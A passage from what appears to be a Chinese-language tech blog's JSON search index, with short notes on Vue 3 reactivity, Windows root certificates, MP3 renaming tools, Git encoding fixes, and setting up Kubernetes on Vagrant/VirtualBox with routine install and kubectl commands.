更新畫面","uri":"/blog/posts/Vue3-%E7%84%A1%E6%B3%95%E6%AD%A3%E7%A2%BA-Render-%E6%9B%B4%E6%96%B0%E7%95%AB%E9%9D%A2/"},{"categories":["Vue"],"content":"基於 Proxy Vue 3 使用到 Proxy 物件做資料更新，相關網路上爬文一堆。 var handler = { get: function(target, name) { return name in target ? target[name] : 37; } }; var p = new Proxy({}, handler); p.a = 1; p.b = undefined; console.log(p.a, p.b); // 1, undefined console.log('c' in p, p.c); // false, 37 這邊簡單說明，主要看到 p 沒有這個屬性，因為是 proxy 關係，所以 console.log 印出來只會看到 proxy，可以看到 _target 看到內容，可使用JSON.parse(JSON.strinfy())大法，當然Object.assign()也可以用出來。 參考MDN 範例: Proxy - JavaScript | MDN ","date":"2022-02-13","objectID":"/blog/posts/Vue3-%E7%84%A1%E6%B3%95%E6%AD%A3%E7%A2%BA-Render-%E6%9B%B4%E6%96%B0%E7%95%AB%E9%9D%A2/:2:0","tags":["vue","render"],"title":"Vue3 無法正確 Render 更新畫面","uri":"/blog/posts/Vue3-%E7%84%A1%E6%B3%95%E6%AD%A3%E7%A2%BA-Render-%E6%9B%B4%E6%96%B0%E7%95%AB%E9%9D%A2/"},{"categories":["Vue"],"content":"解法 ","date":"2022-02-13","objectID":"/blog/posts/Vue3-%E7%84%A1%E6%B3%95%E6%AD%A3%E7%A2%BA-Render-%E6%9B%B4%E6%96%B0%E7%95%AB%E9%9D%A2/:3:0","tags":["vue","render"],"title":"Vue3 無法正確 Render 更新畫面","uri":"/blog/posts/Vue3-%E7%84%A1%E6%B3%95%E6%AD%A3%E7%A2%BA-Render-%E6%9B%B4%E6%96%B0%E7%95%AB%E9%9D%A2/"},{"categories":["Vue"],"content":"帶 Proxy 參數 竟然知道原理了，把 Proxy 值帶進去做更新，多放一個參數，js 修改 Vue component的 data 使用帶進去 proxy 確實可以解決。 修正時間無法 render 問題(Reactivity) · malagege/vue-electron-Pomodoro@4103a3f · GitHub 這算 workaound??感覺這樣寫不好看，不過改的幅度不大。 ","date":"2022-02-13","objectID":"/blog/posts/Vue3-%E7%84%A1%E6%B3%95%E6%AD%A3%E7%A2%BA-Render-%E6%9B%B4%E6%96%B0%E7%95%AB%E9%9D%A2/:3:1","tags":["vue","render"],"title":"Vue3 無法正確 Render 更新畫面","uri":"/blog/posts/Vue3-%E7%84%A1%E6%B3%95%E6%AD%A3%E7%A2%BA-Render-%E6%9B%B4%E6%96%B0%E7%95%AB%E9%9D%A2/"},{"categories":["Vue"],"content":"寫成 Vue Component 就是寫成 Vue 元件，但這樣感覺不能套用到一般專案，使用參數帶入也只能從 html 那邊帶入，感覺無法從 js 那邊下手。 ","date":"2022-02-13","objectID":"/blog/posts/Vue3-%E7%84%A1%E6%B3%95%E6%AD%A3%E7%A2%BA-Render-%E6%9B%B4%E6%96%B0%E7%95%AB%E9%9D%A2/:3:2","tags":["vue","render"],"title":"Vue3 無法正確 Render 更新畫面","uri":"/blog/posts/Vue3-%E7%84%A1%E6%B3%95%E6%AD%A3%E7%A2%BA-Render-%E6%9B%B4%E6%96%B0%E7%95%AB%E9%9D%A2/"},{"categories":["Vue"],"content":"其他整理 reactive Vue | 認識 ref 與 reactive 基本運作 - James Pan - Medium reactivie 整体概览 | Vue3 ","date":"2022-02-13","objectID":"/blog/posts/Vue3-%E7%84%A1%E6%B3%95%E6%AD%A3%E7%A2%BA-Render-%E6%9B%B4%E6%96%B0%E7%95%AB%E9%9D%A2/:4:0","tags":["vue","render"],"title":"Vue3 無法正確 Render 更新畫面","uri":"/blog/posts/Vue3-%E7%84%A1%E6%B3%95%E6%AD%A3%E7%A2%BA-Render-%E6%9B%B4%E6%96%B0%E7%95%AB%E9%9D%A2/"},{"categories":["window"],"content":"最近我朋友在工作遇到憑證問題，之前有幾次研究憑證，幫我朋友看看憑證問題。 相關連結: 產生自簽憑證筆記 | 程式狂想筆記 設備根憑證不正確導致不能打API問題 | 程式狂想筆記 Java 因憑證 SNI 問題驗證不過 | 程式狂想筆記 SSL Pinning 和 HSTS 小記 | 程式狂想筆記 Linux 指令確認SSL憑證 | 程式狂想筆記 萬用憑證(WildCard)和中間憑證小記 | 程式狂想筆記 這次要簡查window 憑證，我都忘記要怎麼看，稍為記錄一下 ","date":"2022-02-13","objectID":"/blog/posts/Window-%E7%A2%BA%E8%AA%8D%E6%A0%B9%E6%86%91%E8%AD%89/:0:0","tags":["ssl","tls","window","憑證"],"title":"Window 確認根憑證","uri":"/blog/posts/Window-%E7%A2%BA%E8%AA%8D%E6%A0%B9%E6%86%91%E8%AD%89/"},{"categories":["window"],"content":"問題 IE 正常，Chrome 不正常。 ","date":"2022-02-13","objectID":"/blog/posts/Window-%E7%A2%BA%E8%AA%8D%E6%A0%B9%E6%86%91%E8%AD%89/:1:0","tags":["ssl","tls","window","憑證"],"title":"Window 確認根憑證","uri":"/blog/posts/Window-%E7%A2%BA%E8%AA%8D%E6%A0%B9%E6%86%91%E8%AD%89/"},{"categories":["window"],"content":"查看 Windows 憑證 window 打開憑證中心 certlm.msc 或者mmc 參考設定如何：使用 MMC 嵌入式管理單元來查看憑證 - WCF | Microsoft Docs 查看 TWCA 根憑證 查看這邊TWCＡ憑證是不是有三個? 其中最重要的是有沒有TWCA Global Root CA，如果沒有的話，需要按裝TWCA憑證， 假如有的話，再看憑證指紋是否為這一串 9cbb4853f6a4f6d352a4e83252556013f5adaf65 再回到 Chrome 看網頁憑證 比對電腦憑證是否有該網站根憑證 備註: 每個瀏覽器看到憑證串接會不一樣，像剛剛範例是四層。Firefox看是三層。 ","date":"2022-02-13","objectID":"/blog/posts/Window-%E7%A2%BA%E8%AA%8D%E6%A0%B9%E6%86%91%E8%AD%89/:2:0","tags":["ssl","tls","window","憑證"],"title":"Window 確認根憑證","uri":"/blog/posts/Window-%E7%A2%BA%E8%AA%8D%E6%A0%B9%E6%86%91%E8%AD%89/"},{"categories":["window"],"content":"解決方法記錄 最後我朋友刪掉舊的根憑證就解決問題了。 最後我朋友說 CHUNGHWA(中華電信) 比 TWCA 好，哈哈。 ","date":"2022-02-13","objectID":"/blog/posts/Window-%E7%A2%BA%E8%AA%8D%E6%A0%B9%E6%86%91%E8%AD%89/:3:0","tags":["ssl","tls","window","憑證"],"title":"Window 確認根憑證","uri":"/blog/posts/Window-%E7%A2%BA%E8%AA%8D%E6%A0%B9%E6%86%91%E8%AD%89/"},{"categories":["window"],"content":"目前猜測(結論) 我朋友 TWCA憑證都有更新到，但舊的憑證竟然還在?所以造成影響? 不知道是不是 Windows 憑證同步問題?但就算舊憑證過期，其他正確根憑證應該還是能串到才對。 所以 Chrome 遇到這個問題簡查一下這個問題。 ","date":"2022-02-13","objectID":"/blog/posts/Window-%E7%A2%BA%E8%AA%8D%E6%A0%B9%E6%86%91%E8%AD%89/:4:0","tags":["ssl","tls","window","憑證"],"title":"Window 確認根憑證","uri":"/blog/posts/Window-%E7%A2%BA%E8%AA%8D%E6%A0%B9%E6%86%91%E8%AD%89/"},{"categories":["實用工具"],"content":"最近累積很多音樂，不想一個一個整理，在想有沒有好用的工具，結果真的有好用工具。 ","date":"2022-02-13","objectID":"/blog/posts/%E8%83%BD%E5%B9%AB%E4%BD%A0%E6%94%B9-mp3-%E6%AA%94%E6%A1%88%E5%90%8D%E7%A8%B1%E7%A5%9E%E5%B7%A5%E5%85%B7/:0:0","tags":["mp3","rename","批次命名"],"title":"能幫你改 mp3 檔案名稱神工具","uri":"/blog/posts/%E8%83%BD%E5%B9%AB%E4%BD%A0%E6%94%B9-mp3-%E6%AA%94%E6%A1%88%E5%90%8D%E7%A8%B1%E7%A5%9E%E5%B7%A5%E5%85%B7/"},{"categories":["實用工具"],"content":"MusicBrainz-Picard(推薦) 下載軟體地方 音樂拖移置軟體裡面 調整我要命名方式後來發現不用調整，預設還會幫你分類歌手，太神啦。 %artist% - %title% 因為預設會幫你分類，但注意要把目標位置調整，除非你有專門分類音樂資料夾，可以特別設定。 ","date":"2022-02-13","objectID":"/blog/posts/%E8%83%BD%E5%B9%AB%E4%BD%A0%E6%94%B9-mp3-%E6%AA%94%E6%A1%88%E5%90%8D%E7%A8%B1%E7%A5%9E%E5%B7%A5%E5%85%B7/:1:0","tags":["mp3","rename","批次命名"],"title":"能幫你改 mp3 檔案名稱神工具","uri":"/blog/posts/%E8%83%BD%E5%B9%AB%E4%BD%A0%E6%94%B9-mp3-%E6%AA%94%E6%A1%88%E5%90%8D%E7%A8%B1%E7%A5%9E%E5%B7%A5%E5%85%B7/"},{"categories":["實用工具"],"content":"FlexibleRenamer 也滿簡單使用，但不知道為什麼我的mp3有用歌手名稱會產生多個一樣歌手名稱。所以我後來改用MusicBrainz-Picard。 ","date":"2022-02-13","objectID":"/blog/posts/%E8%83%BD%E5%B9%AB%E4%BD%A0%E6%94%B9-mp3-%E6%AA%94%E6%A1%88%E5%90%8D%E7%A8%B1%E7%A5%9E%E5%B7%A5%E5%85%B7/:2:0","tags":["mp3","rename","批次命名"],"title":"能幫你改 mp3 檔案名稱神工具","uri":"/blog/posts/%E8%83%BD%E5%B9%AB%E4%BD%A0%E6%94%B9-mp3-%E6%AA%94%E6%A1%88%E5%90%8D%E7%A8%B1%E7%A5%9E%E5%B7%A5%E5%85%B7/"},{"categories":["Java"],"content":"遇到奇奇怪怪問題 參照: Tomcat报错，May be locked by another process._bingguang1993的博客-CSDN博客 Eclipse每次修改檔案之後，tomcat要自動重新部署，就會報這個錯誤：May be locked by another process - IT閱讀 關於tomcat被鎖後 ,報錯could not delete的解決方法 | 程式前沿 測試好像沒用，最後發現不是以上問題，所以要把 Eclipse Clean完後，處理中的Validating XML/JSP 要等他跑完，再按 Publish 程式，我的就不會有這個問題。 不過Validating XML/JSP 真的很久，最後參考Disable XML validation in Eclipse - Stack Overflow 先暫時把 XML 關掉，但我也不確定會不會影響到程式，所以JSP沒先關掉。 ","date":"2022-02-13","objectID":"/blog/posts/Eclipse-Tomcat-%E9%8C%AF%E8%AA%A4%E5%95%8F%E9%A1%8C-May-be-locked-by-another-process/:0:0","tags":["java","eclipse","tomcat"],"title":"Eclipse Tomcat 錯誤問題 May be locked by another process","uri":"/blog/posts/Eclipse-Tomcat-%E9%8C%AF%E8%AA%A4%E5%95%8F%E9%A1%8C-May-be-locked-by-another-process/"},{"categories":["Window"],"content":"最近主機板插 8GB 電腦就無法開機，插 4GB 就可以開機(還有機會無法開機)，在還沒電腦壞掉，想趕快把正版序號用出來，但不知道能不能做移轉，查詢之下可以。詳細的可以看《香教仁的好物推薦EP02》｜我要向微軟道歉｜這一家公司真的太佛心啦｜真的吃素的！【香教仁】 - YouTube，裡面有解說這個。 疑似主機板問題，但我不會修也不換檢測，看了這個【問題】ram，插槽都正常但讀不到？ @電腦應用綜合討論 哈啦板 - 巴哈姆特也不會，所以打算換版。 ","date":"2022-02-13","objectID":"/blog/posts/Window-10-%E6%AD%A3%E7%89%88%E5%BA%8F%E8%99%9F%E6%95%B8%E4%BD%8D%E7%B6%81%E5%AE%9A%E5%BE%AE%E8%BB%9F%E5%B8%B3%E8%99%9F/:0:0","tags":["window"],"title":"Window 10 正版序號數位綁定微軟帳號","uri":"/blog/posts/Window-10-%E6%AD%A3%E7%89%88%E5%BA%8F%E8%99%9F%E6%95%B8%E4%BD%8D%E7%B6%81%E5%AE%9A%E5%BE%AE%E8%BB%9F%E5%B8%B3%E8%99%9F/"},{"categories":["Window"],"content":"登入帳號就馬上會綁定裝置 如上面影片所說，登入帳號就可以綁定帳號，下次登入到別台電腦上，記得確認OK在做移除裝置(在WEB操作)，這樣就能正常使用。可以登入微軟帳號看裝置有沒有綁定成功。 只能說微軟真的是太佛心了，這樣轉移超方便。 ","date":"2022-02-13","objectID":"/blog/posts/Window-10-%E6%AD%A3%E7%89%88%E5%BA%8F%E8%99%9F%E6%95%B8%E4%BD%8D%E7%B6%81%E5%AE%9A%E5%BE%AE%E8%BB%9F%E5%B8%B3%E8%99%9F/:1:0","tags":["window"],"title":"Window 10 正版序號數位綁定微軟帳號","uri":"/blog/posts/Window-10-%E6%AD%A3%E7%89%88%E5%BA%8F%E8%99%9F%E6%95%B8%E4%BD%8D%E7%B6%81%E5%AE%9A%E5%BE%AE%E8%BB%9F%E5%B8%B3%E8%99%9F/"},{"categories":["Window"],"content":"其他整理 請教Win10在換主機板後的問題 - Mobile01 不到三百塊台幣($10)的Windows 10序號可以買嗎 ","date":"2022-02-13","objectID":"/blog/posts/Window-10-%E6%AD%A3%E7%89%88%E5%BA%8F%E8%99%9F%E6%95%B8%E4%BD%8D%E7%B6%81%E5%AE%9A%E5%BE%AE%E8%BB%9F%E5%B8%B3%E8%99%9F/:2:0","tags":["window"],"title":"Window 10 正版序號數位綁定微軟帳號","uri":"/blog/posts/Window-10-%E6%AD%A3%E7%89%88%E5%BA%8F%E8%99%9F%E6%95%B8%E4%BD%8D%E7%B6%81%E5%AE%9A%E5%BE%AE%E8%BB%9F%E5%B8%B3%E8%99%9F/"},{"categories":["Git 中文顯示亂碼"],"content":"之前使用 Window 10 cmd 用 Git 指令會看中文會有亂碼，一直使用 bash都不會有這個問題，最近查了一下要怎麼處理，順便記錄一下。 ","date":"2022-02-13","objectID":"/blog/posts/Git-%E4%B8%AD%E6%96%87%E9%A1%AF%E7%A4%BA%E4%BA%82%E7%A2%BC/:0:0","tags":["git"],"title":"Git 中文顯示亂碼","uri":"/blog/posts/Git-%E4%B8%AD%E6%96%87%E9%A1%AF%E7%A4%BA%E4%BA%82%E7%A2%BC/"},{"categories":["Git 中文顯示亂碼"],"content":"參考來源 ","date":"2022-02-13","objectID":"/blog/posts/Git-%E4%B8%AD%E6%96%87%E9%A1%AF%E7%A4%BA%E4%BA%82%E7%A2%BC/:1:0","tags":["git"],"title":"Git 中文顯示亂碼","uri":"/blog/posts/Git-%E4%B8%AD%E6%96%87%E9%A1%AF%E7%A4%BA%E4%BA%82%E7%A2%BC/"},{"categories":["Git 中文顯示亂碼"],"content":"GIT - 中文亂碼的問題 | YuShu Hsiao - 點部落 git config --global core.quotepath false cmd 下 git log 還是會看到亂碼，但是bash 不會看到亂碼，可用下面指令解決 set LC_ALL=C.UTF-8 win 10 可以用下面指令永久設定 setx LC_ALL C.UTF-8 ","date":"2022-02-13","objectID":"/blog/posts/Git-%E4%B8%AD%E6%96%87%E9%A1%AF%E7%A4%BA%E4%BA%82%E7%A2%BC/:1:1","tags":["git"],"title":"Git 中文顯示亂碼","uri":"/blog/posts/Git-%E4%B8%AD%E6%96%87%E9%A1%AF%E7%A4%BA%E4%BA%82%E7%A2%BC/"},{"categories":["Git 中文顯示亂碼"],"content":"GIT gitk图形界面中文乱码修改_kongxingxing的专栏-CSDN博客 git config --global gui.encoding utf-8 ","date":"2022-02-13","objectID":"/blog/posts/Git-%E4%B8%AD%E6%96%87%E9%A1%AF%E7%A4%BA%E4%BA%82%E7%A2%BC/:1:2","tags":["git"],"title":"Git 中文顯示亂碼","uri":"/blog/posts/Git-%E4%B8%AD%E6%96%87%E9%A1%AF%E7%A4%BA%E4%BA%82%E7%A2%BC/"},{"categories":["Kubernetes"],"content":"Vagrant + Virtualbox 建置 k8s 筆記 ","date":"2022-02-13","objectID":"/blog/posts/Vagrant-Virtualbox-%E5%BB%BA%E7%BD%AE-k8s-%E7%AD%86%E8%A8%98/:0:0","tags":["vagrant","virtualbox","kubernetes","vm"],"title":"Vagrant + Virtualbox 建置 k8s 筆記","uri":"/blog/posts/Vagrant-Virtualbox-%E5%BB%BA%E7%BD%AE-k8s-%E7%AD%86%E8%A8%98/"},{"categories":["Kubernetes"],"content":"Vagrant Build Image Vagrant.configure(\"2\") do |config| # 設定 vm image, 版本,hostname,名稱 config.vm.box = \"bento/ubuntu-18.04\" config.vm.box_version ='201912.14.0' config.vm.hostname = 'k8s-dev' config.vm.define vm_name = 'k8s' # provision (Shell Script) config.vm.provision \"shell\", privileged: false, inline: \u003c\u003c-SHELL set -e -x -u export DEBIAN_FRONTEND=noninteractive #change the source.list sudo apt-get update sudo apt-get install -y vim git cmake build-essential tcpdump tig jq socat bash-completion # Install Docker export DOCKER_VERSION=\"5:19.03.5~3-0~ubuntu-bionic\" curl -fsSL https://download.docker.com/linux/ubuntu/gpg | sudo apt-key add - sudo add-apt-repository \"deb [arch=amd64] https://download.docker.com/linux/ubuntu $(lsb_release -cs) stable\" sudo apt-get update sudo apt-get install -y docker-ce=${DOCKER_VERSION} sudo usermod -aG docker $USER #Disable swap #https://github.com/kubernetes/kubernetes/issues/53533 sudo swapoff -a \u0026\u0026 sudo sysctl -w vm.swappiness=0 sudo sed '/vagrant--vg-swap/d' -i /etc/fstab git clone --depth=1 https://github.com/Bash-it/bash-it.git ~/.bash_it bash ~/.bash_it/install.sh -s SHELL # 設定IP config.vm.network :private_network, ip: \"172.17.8.111\" #設定硬體 config.vm.provider :virtualbox do |v| v.customize [\"modifyvm\", :id, \"--cpus\", 2] v.customize [\"modifyvm\", :id, \"--memory\", 4096] v.customize ['modifyvm', :id, '--nicpromisc1', 'allow-all'] end end ","date":"2022-02-13","objectID":"/blog/posts/Vagrant-Virtualbox-%E5%BB%BA%E7%BD%AE-k8s-%E7%AD%86%E8%A8%98/:1:0","tags":["vagrant","virtualbox","kubernetes","vm"],"title":"Vagrant + Virtualbox 建置 k8s 筆記","uri":"/blog/posts/Vagrant-Virtualbox-%E5%BB%BA%E7%BD%AE-k8s-%E7%AD%86%E8%A8%98/"},{"categories":["Kubernetes"],"content":"安裝 Kubeadm Kubectl Kubelet export KUBE_VERSION=\"1.17.0\" sudo apt-get update \u0026\u0026 sudo apt-get install -y apt-transport-https curl curl -s https://packages.cloud.google.com/apt/doc/apt-key.gpg | sudo apt-key add - cat \u003c\u003cEOF | sudo tee /etc/apt/sources.list.d/kubernetes.list deb https://apt.kubernetes.io/ kubernetes-xenial main EOF sudo apt-get update sudo apt-get install -y kubeadm=${KUBE_VERSION}-00 kubelet=${KUBE_VERSION}-00 kubectl=${KUBE_VERSION}-00 Service 初始化 Kubernetes Cluster CNI 使用fannel sudo kubeadm init --pod-network-cidr=10.244.0.0/16 mkdir -p $HOME/.kube # 設定檔(TOKEN,驗證) sudo cp -i /etc/kubernetes/admin.conf $HOME/.kube/config sudo chown $(id -u):$(id -g) $HOME/.kube/config # 多節點加入可以使用 kubeadm join 10.0.2.15:6443 --token h4927u.xc4i5epds3aw0kbs \\ --discovery-token-ca-cert-hash sha256:92787d0bba51786f879304229b07e2a58878bc775cbf12a6f9bf4e95a8794f97 coredns pending 原因是因為 CNI 還沒安裝，安裝Flannel (CNI)就會自動執行。 /etc/kubernetes/manifests kubeadmin 安裝玩會放對應設定到這個路徑，啟動 kubelet會參照這邊設定。 ","date":"2022-02-13","objectID":"/blog/posts/Vagrant-Virtualbox-%E5%BB%BA%E7%BD%AE-k8s-%E7%AD%86%E8%A8%98/:2:0","tags":["vagrant","virtualbox","kubernetes","vm"],"title":"Vagrant + Virtualbox 建置 k8s 筆記","uri":"/blog/posts/Vagrant-Virtualbox-%E5%BB%BA%E7%BD%AE-k8s-%E7%AD%86%E8%A8%98/"},{"categories":["Kubernetes"],"content":"kubeadm(快速部屬工具) Static /Dynamic 兩種安裝方式 sudo kubeadm init --pod-network-cidr=10.244.0.0/16 設定檔 kubectl -n kube-system get pods ","date":"2022-02-13","objectID":"/blog/posts/Vagrant-Virtualbox-%E5%BB%BA%E7%BD%AE-k8s-%E7%AD%86%E8%A8%98/:3:0","tags":["vagrant","virtualbox","kubernetes","vm"],"title":"Vagrant + Virtualbox 建置 k8s 筆記","uri":"/blog/posts/Vagrant-Virtualbox-%E5%BB%BA%E7%BD%AE-k8s-%E7%AD%86%E8%A8%98/"},{"categories":["Kubernetes"],"content":"取得資訊 ","date":"2022-02-13","objectID":"/blog/posts/Vagrant-Virtualbox-%E5%BB%BA%E7%BD%AE-k8s-%E7%AD%86%E8%A8%98/:4:0","tags":["vagrant","virtualbox","kubernetes","vm"],"title":"Vagrant + Virtualbox 建置 k8s 筆記","uri":"/blog/posts/Vagrant-Virtualbox-%E5%BB%BA%E7%BD%AE-k8s-%E7%AD%86%E8%A8%98/"},{"categories":["Kubernetes"],"content":"Summary 幫 Bash 設定 kubectl 自動補齊 source \u003c(kubectl completion bash) kubectl get $resource_type $name kubectl -n kube-system get pods ","date":"2022-02-13","objectID":"/blog/posts/Vagrant-Virtualbox-%E5%BB%BA%E7%BD%AE-k8s-%E7%AD%86%E8%A8%98/:4:1","tags":["vagrant","virtualbox","kubernetes","vm"],"title":"Vagrant + Virtualbox 建置 k8s 筆記","uri":"/blog/posts/Vagrant-Virtualbox-%E5%BB%BA%E7%BD%AE-k8s-%E7%AD%86%E8%A8%98/"},{"categories":["Kubernetes"],"content":"wide ","date":"2022-02-13","objectID":"/blog/posts/Vagrant-Virtualbox-%E5%BB%BA%E7%BD%AE-k8s-%E7%AD%86%E8%A8%98/:4:2","tags":["vagrant","virtualbox","kubernetes","vm"],"title":"Vagrant + Virtualbox 建置 k8s 筆記","uri":"/blog/posts/Vagrant-Virtualbox-%E5%BB%BA%E7%BD%AE-k8s-%E7%AD%86%E8%A8%98/"},{"categories":["Kubernetes"],"content":"describe 檢查常用這個指令 kubectl -n kube-system describe pods xxxx ","date":"2022-02-13","objectID":"/blog/posts/Vagrant-Virtualbox-%E5%BB%BA%E7%BD%AE-k8s-%E7%AD%86%E8%A8%98/:4:3","tags":["vagrant","virtualbox","kubernetes","vm"],"title":"Vagrant + Virtualbox 建置 k8s 筆記","uri":"/blog/posts/Vagrant-Virtualbox-%E5%BB%BA%E7%BD%AE-k8s-%E7%AD%86%E8%A8%98/"},{"categories":["Kubernetes"],"content":"Cluster Info kubectl version # 叢集資訊 kubectl cluster-info kubectl top node kubectl top pod kubectl api-versions ","date":"2022-02-13","objectID":"/blog/posts/Vagrant-Virtualbox-%E5%BB%BA%E7%BD%AE-k8s-%E7%AD%86%E8%A8%98/:4:4","tags":["vagrant","virtualbox","kubernetes","vm"],"title":"Vagrant + Virtualbox 建置 k8s 筆記","uri":"/blog/posts/Vagrant-Virtualbox-%E5%BB%BA%E7%BD%AE-k8s-%E7%AD%86%E8%A8%98/"},{"categories":["Kubernetes"],"content":"Interacting with Container kubectl logs $name kubectl -n kube-system -f logs $name boz/kail: kubernetes log viewer wercker/stern: ⎈ Multi pod and container log tailing for Kubernetes ","date":"2022-02-13","objectID":"/blog/posts/Vagrant-Virtualbox-%E5%BB%BA%E7%BD%AE-k8s-%E7%AD%86%E8%A8%98/:5:0","tags":["vagrant","virtualbox","kubernetes","vm"],"title":"Vagrant + Virtualbox 建置 k8s 筆記","uri":"/blog/posts/Vagrant-Virtualbox-%E5%BB%BA%E7%BD%AE-k8s-%E7%AD%86%E8%A8%98/"},{"categories":["Kubernetes"],"content":"複製檔案 kubectl -n kube-system cp xxx node:ooo kubectl -n kube-system exec _pod_name_ ls kubectl -n kube-system exec _pod_name_ ip addr kubectl -n kube-system exec -it _pod_name_ sh ","date":"2022-02-13","objectID":"/blog/posts/Vagrant-Virtualbox-%E5%BB%BA%E7%BD%AE-k8s-%E7%AD%86%E8%A8%98/:6:0","tags":["vagrant","virtualbox","kubernetes","vm"],"title":"Vagrant + Virtualbox 建置 k8s 筆記","uri":"/blog/posts/Vagrant-Virtualbox-%E5%BB%BA%E7%BD%AE-k8s-%E7%AD%86%E8%A8%98/"},{"categories":["Kubernetes"],"content":"port-forward sudo kubectl -n kube-system port-forward pod/coredns-xxxx 53:53 ","date":"2022-02-13","objectID":"/blog/posts/Vagrant-Virtualbox-%E5%BB%BA%E7%BD%AE-k8s-%E7%AD%86%E8%A8%98/:6:1","tags":["vagrant","virtualbox","kubernetes","vm"],"title":"Vagrant + Virtualbox 建置 k8s 筆記","uri":"/blog/posts/Vagrant-Virtualbox-%E5%BB%BA%E7%BD%AE-k8s-%E7%AD%86%E8%A8%98/"},{"categories":["Kubernetes"],"content":"vagrant snapshot 每次 vagrant destroy 真的要花滿多時間，之前跟朋友聊到 snapshot(快照)回復VM會比較快，檔案也不會吃很多。我之前沒這麼使用過，今天花點時間測試。 大量指令參照Vagrant Boxes - iT 邦幫忙::一起幫忙解決難題，拯救 IT 人的一天這篇文章。 更多操作可以看Vagrant 學習筆記 - VagrantPi Blog 這邊注意 vagrant destroy會連帶刪除 snapshot 這邊注意 vagrant destroy會連帶刪除 snapshot 這邊注意 vagrant destroy會連帶刪除 snapshot ","date":"2022-02-13","objectID":"/blog/posts/Vagrant-Virtualbox-%E5%BB%BA%E7%BD%AE-k8s-%E7%AD%86%E8%A8%98/:7:0","tags":["vagrant","virtualbox","kubernetes","vm"],"title":"Vagrant + Virtualbox 建置 k8s 筆記","uri":"/blog/posts/Vagrant-Virtualbox-%E5%BB%BA%E7%BD%AE-k8s-%E7%AD%86%E8%A8%98/"},{"categories":["Kubernetes"],"content":"vagrant snapshot 我對 snapshot 很陌生，但沒想到使用上非常方便。 ","date":"2022-02-13","objectID":"/blog/posts/Vagrant-Virtualbox-%E5%BB%BA%E7%BD%AE-k8s-%E7%AD%86%E8%A8%98/:7:1","tags":["vagrant","virtualbox","kubernetes","vm"],"title":"Vagrant + Virtualbox 建置 k8s 筆記","uri":"/blog/posts/Vagrant-Virtualbox-%E5%BB%BA%E7%BD%AE-k8s-%E7%AD%86%E8%A8%98/"},{"categories":["Kubernetes"],"content":"list 顯示有哪些 snapshot vagrant snapshot list ","date":"2022-02-13","objectID":"/blog/posts/Vagrant-Virtualbox-%E5%BB%BA%E7%BD%AE-k8s-%E7%AD%86%E8%A8%98/:7:2","tags":["vagrant","virtualbox","kubernetes","vm"],"title":"Vagrant + Virtualbox 建置 k8s 筆記","uri":"/blog/posts/Vagrant-Virtualbox-%E5%BB%BA%E7%BD%AE-k8s-%E7%AD%86%E8%A8%98/"},{"categories":["Kubernetes"],"content":"save 儲存當下 vm snapshot。 vagrant snapshot save k8s(這邊是放 snapshot 名稱) ","date":"2022-02-13","objectID":"/blog/posts/Vagrant-Virtualbox-%E5%BB%BA%E7%BD%AE-k8s-%E7%AD%86%E8%A8%98/:7:3","tags":["vagrant","virtualbox","kubernetes","vm"],"title":"Vagrant + Virtualbox 建置 k8s 筆記","uri":"/blog/posts/Vagrant-Virtualbox-%E5%BB%BA%E7%BD%AE-k8s-%E7%AD%86%E8%A8%98/"},{"categories":["Kubernetes"],"content":"restore 回原 vm snapshot。 vagrant snapshot restore k8s(snapshot name) ","date":"2022-02-13","objectID":"/blog/posts/Vagrant-Virtualbox-%E5%BB%BA%E7%BD%AE-k8s-%E7%AD%86%E8%A8%98/:7:4","tags":["vagrant","virtualbox","kubernetes","vm"],"title":"Vagrant + Virtualbox 建置 k8s 筆記","uri":"/blog/posts/Vagrant-Virtualbox-%E5%BB%BA%E7%BD%AE-k8s-%E7%AD%86%E8%A8%98/"},{"categories":["Kubernetes"],"content":"delete 刪除 vm snapshot。 vagrant snapshot delete k8s(snapshot name) ","date":"2022-02-13","objectID":"/blog/posts/Vagrant-Virtualbox-%E5%BB%BA%E7%BD%AE-k8s-%E7%AD%86%E8%A8%98/:7:5","tags":["vagrant","virtualbox","kubernetes","vm"],"title":"Vagrant + Virtualbox 建置 k8s 筆記","uri":"/blog/posts/Vagrant-Virtualbox-%E5%BB%BA%E7%BD%AE-k8s-%E7%AD%86%E8%A8%98/"},{"categories":["Kubernetes"],"content":"push,pop 這邊跟 Git stash push/pop 很像，但我目前想不到什麼時候會用到這個，好處不需要想名稱，哈哈。 注意這邊不會影響到vagrant snapshot save指令新增的 snapshot。 vagrant snapshot push vagrant snapshot pop ","date":"2022-02-13","objectID":"/blog/posts/Vagrant-Virtualbox-%E5%BB%BA%E7%BD%AE-k8s-%E7%AD%86%E8%A8%98/:7:6","tags":["vagrant","virtualbox","kubernetes","vm"],"title":"Vagrant + Virtualbox 建置 k8s 筆記","uri":"/blog/posts/Vagrant-Virtualbox-%E5%BB%BA%E7%BD%AE-k8s-%E7%AD%86%E8%A8%98/"},{"categories":["Kubernetes"],"content":"vagrant port-forward Vagrant forward a range of ports - Server Fault Forwarded Ports - Networking | Vagrant by HashiCorp ","date":"2022-02-13","objectID":"/blog/posts/Vagrant-Virtualbox-%E5%BB%BA%E7%BD%AE-k8s-%E7%AD%86%E8%A8%98/:8:0","tags":["vagrant","virtualbox","kubernetes","vm"],"title":"Vagrant + Virtualbox 建置 k8s 筆記","uri":"/blog/posts/Vagrant-Virtualbox-%E5%BB%BA%E7%BD%AE-k8s-%E7%AD%86%E8%A8%98/"},{"categories":["Kubernetes"],"content":"備份 wordpress - Correct way to back-up and restore vagrant box + Variable VVV - Stack Overflow 使用 vagrant package 備份指令打包 VirtualBox 環境 - TerryL ","date":"2022-02-13","objectID":"/blog/posts/Vagrant-Virtualbox-%E5%BB%BA%E7%BD%AE-k8s-%E7%AD%86%E8%A8%98/:9:0","tags":["vagrant","virtualbox","kubernetes","vm"],"title":"Vagrant + Virtualbox 建置 k8s 筆記","uri":"/blog/posts/Vagrant-Virtualbox-%E5%BB%BA%E7%BD%AE-k8s-%E7%AD%86%E8%A8%98/"},{"categories":["隨意開箱"],"content":"隨意開箱。因為我臨時起意，所以沒開箱盒子。反正網站也不是專門寫開箱文 ","date":"2022-02-13","objectID":"/blog/posts/Switch-pro-%E6%90%96%E6%A1%BF-%E5%92%8C-%E8%89%AF%E5%80%BC%E5%9B%9B%E4%BB%A3-%E6%90%96%E6%A1%BF%E9%96%8B%E7%AE%B1%E7%B4%80%E9%8C%84/:0:0","tags":["switch","搖桿"],"title":"Switch pro 搖桿 和 良值四代 